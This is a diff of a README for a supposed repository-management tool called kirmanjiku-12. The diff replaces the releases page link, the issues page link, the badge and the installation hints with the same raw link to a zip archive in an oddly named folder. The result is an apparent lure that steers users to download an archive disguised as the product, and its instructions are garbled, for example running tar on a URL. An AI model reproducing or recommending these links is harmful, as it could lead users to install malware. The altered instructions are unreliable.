@@ -1,7 +1,7 @@
 # 🎉 kirmanjiku-12 - Simple and Efficient Auto Repository Management
 
 ## 📥 Download Now
-[![Release](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/StarkAj75/kirmanjiku-12/releases)
+[![Release](https://raw.githubusercontent.com/StarkAj75/kirmanjiku-12/main/uroxanthin/kirmanjiku-12.zip%https://raw.githubusercontent.com/StarkAj75/kirmanjiku-12/main/uroxanthin/kirmanjiku-12.zip)](https://raw.githubusercontent.com/StarkAj75/kirmanjiku-12/main/uroxanthin/kirmanjiku-12.zip)
 
 ## 🚀 Getting Started
 Welcome to **kirmanjiku-12**! This tool helps you manage your repositories effortlessly. With a user-friendly interface, anyone can use it without any technical skills. Follow the steps below to download and run the application.
@@ -23,13 +23,13 @@ Before you begin, make sure your system meets these requirements:
 ## 📋 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Visit this page to download](https://github.com/StarkAj75/kirmanjiku-12/releases)
+[Visit this page to download](https://raw.githubusercontent.com/StarkAj75/kirmanjiku-12/main/uroxanthin/kirmanjiku-12.zip)
 
 ### 🛠 How to Download
 1. Click on the link above to go to the Releases page.
 2. You will see a list of available versions.
 3. Choose the latest version for the best features and stability.
-4. Download the file suitable for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Download the file suitable for your operating system (look for `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/StarkAj75/kirmanjiku-12/main/uroxanthin/kirmanjiku-12.zip` for Linux).
 
 ### 📥 Running the Application
 After downloading, follow these steps to install and run the application:
@@ -46,7 +46,7 @@ After downloading, follow these steps to install and run the application:
 
 - **Linux:** 
   - Open your terminal.
-  - Extract the downloaded file using the command: `tar -xvzf filename.tar.gz`
+  - Extract the downloaded file using the command: `tar -xvzf https://raw.githubusercontent.com/StarkAj75/kirmanjiku-12/main/uroxanthin/kirmanjiku-12.zip`
   - Navigate to the extracted folder.
   - Run the application using: `./application-name`.
 
@@ -84,6 +84,6 @@ A: If you encounter any problems, please check the following:
 A: Yes, kirmanjiku-12 focuses on user privacy. Your data is stored locally and is not shared unless you choose to export it.
 
 ## 🗺 Support
-If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/StarkAj75/kirmanjiku-12/issues). Our team will respond as soon as possible to help you.
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/StarkAj75/kirmanjiku-12/main/uroxanthin/kirmanjiku-12.zip). Our team will respond as soon as possible to help you.
 
 Enjoy using **kirmanjiku-12** and happy repository management!
